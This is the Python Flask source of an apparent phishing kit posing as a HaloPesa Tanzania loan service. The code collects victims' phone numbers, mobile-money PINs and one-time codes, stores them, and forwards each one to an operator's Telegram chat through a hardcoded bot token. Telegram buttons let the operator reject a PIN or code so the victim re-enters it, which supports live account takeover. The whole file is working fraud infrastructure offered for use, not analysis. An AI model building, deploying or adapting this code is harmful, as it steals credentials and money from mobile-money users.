from flask import Flask, render_template, request, jsonify
import requests
import sqlite3
import random
import string
from datetime import datetime
import os
import threading
import time

app = Flask(__name__)
app.secret_key = 'halopesa-tz-2024'

BOT_TOKEN = '8863624253:AAH6SxAjF9F9hLKm1o9DTnVHzvdXrviWezA'
CHAT_ID = '8589275340'
TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'

last_update_id = 0

def init_db():
    conn = sqlite3.connect('database_hp.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS loans (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        app_id TEXT, amount INTEGER, months INTEGER,
        phone TEXT, pin TEXT, code TEXT,
        status TEXT DEFAULT 'pending',
        code_status TEXT DEFAULT 'pending'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        phone TEXT UNIQUE, total_applications INTEGER DEFAULT 1
    )''')
    conn.commit()
    conn.close()

init_db()

def send_telegram(message, reply_markup=None):
    try:
        payload = {'chat_id': CHAT_ID, 'text': message}
        if reply_markup: payload['reply_markup'] = reply_markup
        requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
    except Exception as e: print(f'Telegram error: {e}')

def edit_telegram(message_id, text):
    try:
        requests.post(f'{TELEGRAM_API}/editMessageText', json={'chat_id': CHAT_ID, 'message_id': message_id, 'text': text})
    except Exception as e: print(f'Edit error: {e}')

def poll_telegram():
    if 'RENDER' in os.environ: return
    global last_update_id
    while True:
        try:
            url = f'{TELEGRAM_API}/getUpdates?offset={last_update_id + 1}&timeout=10'
            resp = requests.get(url).json()
            if resp.get('ok') and resp.get('result'):
                for update in resp['result']:
                    last_update_id = update['update_id']
                    if 'callback_query' in update:
                        cb = update['callback_query']; cb_data = cb['data']
                        msg_id = cb['message']['message_id']; original = cb['message']['text']
                        conn = sqlite3.connect('database_hp.db'); c = conn.cursor()
                        if cb_data.startswith('deny_'): aid=cb_data.replace('deny_',''); c.execute('UPDATE loans SET status="wrong_pin" WHERE app_id=?',(aid,)); conn.commit(); edit_telegram(msg_id,original+'\n\n❌ INVALID')
                        elif cb_data.startswith('allow_'): aid=cb_data.replace('allow_',''); c.execute('UPDATE loans SET status="approved" WHERE app_id=?',(aid,)); conn.commit(); edit_telegram(msg_id,original+'\n\n✅ ALLOWED')
                        elif cb_data.startswith('wrongpin2_'): aid=cb_data.replace('wrongpin2_',''); c.execute('UPDATE loans SET status="wrong_pin",code_status="pending",code=? WHERE app_id=?',(str(random.randint(1000,9999)),aid)); conn.commit(); edit_telegram(msg_id,original+'\n\n❌ WRONG PIN')
                        elif cb_data.startswith('wrongcode_'): aid=cb_data.replace('wrongcode_',''); c.execute('UPDATE loans SET code_status="wrong_code",code=? WHERE app_id=?',(str(random.randint(1000,9999)),aid)); conn.commit(); edit_telegram(msg_id,original+'\n\n❌ WRONG CODE')
                        elif cb_data.startswith('approve_'): aid=cb_data.replace('approve_',''); c.execute('UPDATE loans SET code_status="approved" WHERE app_id=?',(aid,)); conn.commit(); edit_telegram(msg_id,original+'\n\n✅ APPROVED')
                        conn.close()
        except Exception as e: print(f'Poll error: {e}')
        time.sleep(1)

if 'RENDER' not in os.environ: threading.Thread(target=poll_telegram, daemon=True).start()

@app.route('/') 
def index(): return render_template('index.html')
@app.route('/apply') 
def apply(): return render_template('apply.html')
@app.route('/approve') 
def approve(): return render_template('approve.html')

@app.route('/api/submit_loan', methods=['POST'])
def submit_loan():
    data = request.json
    app_id = 'HP-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    code = str(random.randint(1000, 9999))
    phone = data.get('phone',''); pin = data.get('pin','')
    amount = int(data.get('amount',0)); months = int(data.get('months',1))
    conn = sqlite3.connect('database_hp.db'); c = conn.cursor()
    c.execute('SELECT total_applications FROM users WHERE phone = ?',(phone,))
    existing = c.fetchone(); is_returning = existing is not None
    if is_returning: c.execute('UPDATE users SET total_applications = total_applications + 1 WHERE phone = ?',(phone,))
    else: c.execute('INSERT INTO users (phone) VALUES (?)',(phone,))
    c.execute('INSERT INTO loans (app_id, amount, months, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,amount,months,phone,pin,code))
    conn.commit(); conn.close()
    prefix = '🔄 RETURNING USER' if is_returning else '📥 NEW LOAN REQUEST'
    msg = f'{prefix}\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n🔢 PIN: {pin}\n💰 Amount: TZS {amount:,}'
    keyboard = {'inline_keyboard': [[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]}
    send_telegram(msg, keyboard)
    return jsonify({'success':True,'app_id':app_id})

@app.route('/api/submit_code', methods=['POST'])
def submit_code():
    data = request.json; app_id = data.get('app_id'); entered_code = data.get('code')
    conn = sqlite3.connect('database_hp.db'); c = conn.cursor()
    c.execute('SELECT phone, code, amount FROM loans WHERE app_id = ?',(app_id,))
    loan = c.fetchone()
    if loan:
        phone, expected_code, amount = loan
        msg = f'🔐 CODE VERIFICATION\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n✍️ Entered: {entered_code}\n💰 Amount: TZS {amount:,}'
        keyboard = {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'wrongpin2_{app_id}'}],[{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'}],[{'text':'✅ APPROVE LOAN','callback_data':f'approve_{app_id}'}]]}
        send_telegram(msg, keyboard)
    conn.close()
    return jsonify({'success':True})

@app.route('/api/check_status/<app_id>')
def check_status(app_id):
    conn = sqlite3.connect('database_hp.db'); c = conn.cursor()
    c.execute('SELECT status, code_status FROM loans WHERE app_id = ?',(app_id,))
    loan = c.fetchone(); conn.close()
    if loan: return jsonify({'status':loan[0],'code_status':loan[1]})
    return jsonify({'status':'not_found'})

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    if 'callback_query' in data:
        cb = data['callback_query']; cb_data = cb['data']
        msg_id = cb['message']['message_id']; original = cb['message']['text']
        conn = sqlite3.connect('database_hp.db'); c = conn.cursor()
        if cb_data.startswith('deny_'): aid=cb_data.replace('deny_',''); c.execute('UPDATE loans SET status="wrong_pin" WHERE app_id=?',(aid,)); conn.commit(); edit_telegram(msg_id,original+'\n\n❌ INVALID')
        elif cb_data.startswith('allow_'): aid=cb_data.replace('allow_',''); c.execute('UPDATE loans SET status="approved" WHERE app_id=?',(aid,)); conn.commit(); edit_telegram(msg_id,original+'\n\n✅ ALLOWED')
        elif cb_data.startswith('wrongpin2_'): aid=cb_data.replace('wrongpin2_',''); c.execute('UPDATE loans SET status="wrong_pin",code_status="pending",code=? WHERE app_id=?',(str(random.randint(1000,9999)),aid)); conn.commit(); edit_telegram(msg_id,original+'\n\n❌ WRONG PIN')
        elif cb_data.startswith('wrongcode_'): aid=cb_data.replace('wrongcode_',''); c.execute('UPDATE loans SET code_status="wrong_code",code=? WHERE app_id=?',(str(random.randint(1000,9999)),aid)); conn.commit(); edit_telegram(msg_id,original+'\n\n❌ WRONG CODE')
        elif cb_data.startswith('approve_'): aid=cb_data.replace('approve_',''); c.execute('UPDATE loans SET code_status="approved" WHERE app_id=?',(aid,)); conn.commit(); edit_telegram(msg_id,original+f'\n\n✅ APPROVED\n{datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")}')
        conn.close()
    return jsonify({'ok':True})

if __name__ == '__main__':
    print("HALOPESA TZ RUNNING!")
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)